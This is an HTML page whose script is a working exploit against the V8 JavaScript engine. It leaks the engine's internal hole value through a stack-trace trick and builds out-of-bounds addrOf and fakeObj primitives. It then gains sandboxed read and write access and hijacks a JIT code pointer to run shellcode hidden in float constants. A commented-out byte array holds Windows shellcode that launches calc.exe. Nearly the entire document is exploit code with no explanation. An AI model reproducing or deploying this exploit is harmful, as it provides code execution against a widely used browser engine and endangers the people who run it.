<pre id="log"></pre>

<script>
function print(_log) {
  console.log(`${_log}`)
  document.getElementById("log").innerHTML += `${_log}<br/>`
}

// let ab = new ArrayBuffer(0x300);
// let fb = new Float64Array(ab);
// let ub = new Uint8Array(ab);
// let test = new Uint8Array([0x90,0x48,0x31,0xd2,0x90,0x90,0xeb,0xc,0x65,0x48,0x8b,0x42,0x60,0x90,0xeb,0xc,0x48,0x8b,0x70,0x18,0x90,0x90,0xeb,0xc,0x48,0x8b,0x76,0x20,0x90,0x90,0xeb,0xc,0x4c,0x8b,0x0e,0x90,0x90,0x90,0xeb,0xc,0x4d,0x8b,0x09,0x90,0x90,0x90,0xeb,0xc,0x4d,0x8b,0x49,0x20,0x90,0x90,0xeb,0xc,0xe9,0x4a,0x03,0x00,0x00,0x90,0xeb,0xc,0x41,0x8b,0x49,0x3c,0x90,0x90,0xeb,0xc,0x4d,0x31,0xff,0x90,0x90,0x90,0xeb,0xc,0x41,0xb7,0x88,0x90,0x90,0x90,0xeb,0xc,0x4d,0x01,0xcf,0x90,0x90,0x90,0xeb,0xc,0x49,0x01,0xcf,0x90,0x90,0x90,0xeb,0xc,0x45,0x8b,0x3f,0x90,0x90,0x90,0xeb,0xc,0x90,0x4d,0x01,0xcf,0x90,0x90,0xeb,0xc,0x41,0x8b,0x4f,0x18,0x90,0x90,0xeb,0xc,0x45,0x8b,0x77,0x20,0x90,0x90,0xeb,0xf,0x4d,0x01,0xce,0x90,0x90,0x90,0xeb,0xf,0x48,0x85,0xc9,0x90,0x90,0x90,0xeb,0xf,0x75,0x2c,0x90,0x90,0x90,0x90,0xeb,0xf,0xe9,0x23,0x02,0x00,0x00,0x90,0xeb,0xf,0xff,0xc9,0x90,0x90,0x90,0x90,0xeb,0xf,0x48,0x31,0xf6,0x90,0x90,0x90,0xeb,0xf,0x41,0x8b,0x34,0x8e,0x90,0x90,0xeb,0xf,0x4c,0x01,0xce,0x90,0x90,0x90,0xeb,0xf,0x48,0x31,0xc0,0x90,0x90,0x90,0xeb,0xf,0x90,0x90,0x48,0x31,0xd2,0x90,0xeb,0xf,0xfc,0x90,0x90,0x90,0x90,0x90,0xeb,0xf,0xac,0x90,0x90,0x90,0x90,0x90,0xeb,0xf,0x84,0xc0,0x90,0x90,0x90,0x90,0xeb,0xf,0x74,0x5a,0x90,0x90,0x90,0x90,0xeb,0xf,0xc1,0xca,0x0d,0x90,0x90,0x90,0xeb,0xf,0x01,0xc2,0x90,0x90,0x90,0x90,0xeb,0xf,0xe9,0x88,0xff,0xff,0xff,0x90,0xeb,0xf,0x44,0x39,0xc2,0x90,0x90,0x90,0xeb,0xf,0x0F,0x85,0x73,0xFE,0xFF,0xFF,0xeb,0xf,0x45,0x8b,0x57,0x24,0x90,0x90,0xeb,0xf,0x4d,0x01,0xca,0x90,0x90,0x90,0xeb,0xf,0x41,0x0f,0xb7,0x0c,0x4a,0x90,0xeb,0xf,0x45,0x8b,0x5f,0x1c,0x90,0x90,0xeb,0xf,0x4d,0x01,0xcb,0x90,0x90,0x90,0xeb,0xf,0x41,0x8b,0x04,0x8b,0x90,0x90,0xeb,0xf,0x4c,0x01,0xc8,0x90,0x90,0x90,0xeb,0xf,0xc3,0x90,0x90,0x90,0x90,0x90,0xeb,0xf,0x90,0xc3,0x90,0x90,0x90,0x90,0xeb,0xf,0x41,0xb8,0x98,0xfe,0x8a,0x0e,0xeb,0xf,0xe8,0xa9,0xfc,0xff,0xff,0x90,0xeb,0xf,0x48,0x31,0xc9,0x90,0x90,0x90,0xeb,0xf,0x51,0x90,0x90,0x90,0x90,0x90,0xeb,0xf,0x4d,0x31,0xd2,0x90,0x90,0x90,0xeb,0xf,0x41,0xba,0x63,0x61,0x6c,0x63,0xeb,0xf,0xb9,0x2e,0x65,0x78,0x65,0x90,0xeb,0xf,0x48,0xc1,0xe1,0x20,0x90,0x90,0xeb,0xf,0x4c,0x01,0xd1,0x90,0x90,0x90,0xeb,0xf,0x90,0x51,0x90,0x90,0x90,0x90,0xeb,0xf,0x48,0x8d,0x0c,0x24,0x90,0x90,0xeb,0xf,0x48,0x31,0xd2,0x90,0x90,0x90,0xeb,0xf,0x48,0xff,0xc2,0x90,0x90,0x90,0xeb,0xf,0x48,0x83,0xec,0x48,0x90,0x90,0xeb,0xf,0x48,0x83,0xec,0x58,0x90,0x90,0xeb,0xf,0x48,0x83,0xec,0x68,0x90,0x90,0xeb,0xf,0x48,0x83,0xec,0x78,0x90,0x90,0xeb,0xf,0x90,0x90,0x52,0x90,0x90,0x90,0xeb,0xf,0x90,0x90,0x51,0x90,0x90,0x90,0xeb,0xf,0xff,0xd0,0x90,0x90,0x90,0x90,0xeb,0xf,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90])
// ub.set(test)
// console.log(fb)

const jitme = () => {
  return [1.97118317862187e-246, 1.9711301900293496e-246, 1.9711823868697424e-246, 1.9711824210688e-246, 1.9711828967254104e-246, 1.9711828966421608e-246, 1.9711824203195522e-246, 1.9710251538347258e-246, 1.971182539666601e-246, 1.9711829007322022e-246, 1.9711828987595668e-246, 1.9711828999298813e-246, 1.9711828999298803e-246, 1.9711828975412576e-246, 1.9711831650358121e-246, 1.9711823863202913e-246, 5.548385260674813e-232, 5.5483866084552014e-232, 5.548386608245035e-232, 5.5483866055574394e-232, 5.547942592663461e-232, 5.54838660558628e-232, 5.548386610338606e-232, 5.548386577268016e-232, 5.548386608455201e-232, 5.548386607807868e-232, 5.54858817345081e-232, 5.548386605575843e-232, 5.5483866055757856e-232, 5.548386605584544e-232, 5.54838660556586e-232, 5.548386599447035e-232, 5.548386605584817e-232, 5.548728865584518e-232, 5.5483866079030605e-232, 5.636005154816237e-232, 5.5483853071654144e-232, 5.548386608267739e-232, 5.548170027164773e-232, 5.5483852115597425e-232, 5.548386608314605e-232, 5.5483865390257476e-232, 5.5483866081740075e-232, 5.548386605575802e-232, 5.548386605585102e-232, 5.4461540018054204e-232, 5.548728865449962e-232, 5.5483866082296575e-232, 5.5483866055757205e-232, 5.548386608651451e-232, 5.512893182999385e-232, 5.5482542463006294e-232, 5.548385265652447e-232, 5.548386608595797e-232, 5.548386605564232e-232, 5.548385303650868e-232, 5.548386608651447e-232, 5.548386607939311e-232, 5.548385746059598e-232, 5.54838593802079e-232, 5.548386129981982e-232, 5.548386321943174e-232, 5.548386602670103e-232, 5.5483866026232374e-232, 5.548386605587561e-232, -6.828527034422786e-229, 7.1e-322, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
}

for (let i = 0; i < 0x10000; i+=1) {
  jitme();jitme();jitme();jitme();jitme();
}

var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
var uint32 = new Uint32Array(buf);

function f2i(f) {
  float64[0] = f;
  return bigUint64[0];
}

function i2f(i) {
  bigUint64[0] = i;
  return float64[0];
}

function i322f(l, u) {
  uint32[0] = Number(l);
  uint32[1] = Number(u);
  return float64[0];
}

Number.prototype.toBigInt = function toBigInt() {
  float64[0] = this;
  return bigUint64[0];
};

BigInt.prototype.toNumber = function toNumber() {
  bigUint64[0] = this;
  return float64[0];
};

function hex(i) {
  return i.toString(16).padStart(16, "0");
}

// =================== //
//     Start here!     //
// =================== //

var h0le = [0];
function leak_hole() {
  function rGlobal() {
      h0le[0] = stack;
  }
  Error.captureStackTrace(globalThis);
  Error.prepareStackTrace = function() {
    Reflect.deleteProperty(Error, 'prepareStackTrace');
    Reflect.deleteProperty(globalThis, 'stack');
    Reflect.defineProperty(
      globalThis, 
      'stack',
      {configurable: false, writable: true, enumerable: true, value: 1}
	  );
    stack = undefined;
    for (let i = 0; i < 100000; i++) {
      rGlobal();
    }
    return undefined;
  };
  Reflect.defineProperty(
	  globalThis, 
	  'stack',
	  {configurable: true, writable: true, enumerable: true, value: undefined}
  );
  delete globalThis.stack;
  rGlobal();
  return h0le[0];
}

const the = {  hole: leak_hole()  };
let f_arr;  
let o_arr;
let oobReadValue;
let oobAddrOfValue;
let oobFakeObjValue;

function addrOf(bool, _inner_object) {
  let hole = the.hole;
  let idx = (Number(bool ? hole : -1) | 0) + 1;
  f_arr = [1.1];
  o_arr = [_inner_object];
  oobAddrOfValue = f2i(f_arr.at(idx * 4));
  return oobAddrOfValue & 0xffffffffn
}
for (var i = 0; i < 0x10000; i++) {
  addrOf(true, {}); // put some dummy shit
}

function fakeObj(bool, _inner_float) {
  let hole = the.hole;
  let idx = (Number(bool ? hole : -1) | 0) + 1;
  o_arr = [{}];
  f_arr = [_inner_float];
  oobFakeObjValue = o_arr.at(idx * 7);
  return oobFakeObjValue
}
for (var i = 0; i < 0x10000; i++) {
  fakeObj(true, 1.1); // put some dummy shit
}

// let test = [];
// %DebugPrint(test);
// let testAddr = addrOf(true, test);
// %DebugPrint(testAddr.toString(16));
// let fake = fakeObj(true, i322f(testAddr, testAddr));
// %DebugPrint(fake);

function relativeRead(bool) {
  let hole = the.hole;
  let idx = (Number(bool ? hole : -1) | 0) + 1;
  f_arr = [1.1];
  o_arr = [{}];
  oobReadValue = f2i(f_arr.at(idx * 1));
  return oobReadValue
}
for (var i = 0; i < 0x10000; i++) {
  relativeRead(true)
}

function sandboxRead(_address) {
  let readArray = [1.1, 2.2];
  readArray[0] = i2f(oobReadValue);
  readArray[1] = i322f(_address - 8n, 0x10);
  let readArrayAddress = addrOf(true, readArray);
  let fakeObject = fakeObj(true, i322f(readArrayAddress - 0x10n, readArrayAddress - 0x10n));
  return f2i(fakeObject[0]);
}

// let test = [];
// let testAddr = addrOf(true, test);
// let testRead = sandboxRead(testAddr);
// print(testRead.toString(16));

function sandboxWrite(_address, _value) {
  let readArray = [1.1, 2.2];
  readArray[0] = i2f(oobReadValue);
  readArray[1] = i322f(_address - 8n, 0x10);
  let readArrayAddress = addrOf(true, readArray);
  let fakeObject = fakeObj(true, i322f(readArrayAddress - 0x10n, readArrayAddress - 0x10n));
  fakeObject[0] = i2f(_value)
}

let addressOfJit = addrOf(true, jitme);
let addressofPointerToCodePointer = sandboxRead(addressOfJit+0x18n) & 0xffffffffn
let codePointer = sandboxRead(addressofPointerToCodePointer+0xcn)
sandboxWrite(addressofPointerToCodePointer+0xcn, codePointer+0x66n)
jitme()

</script>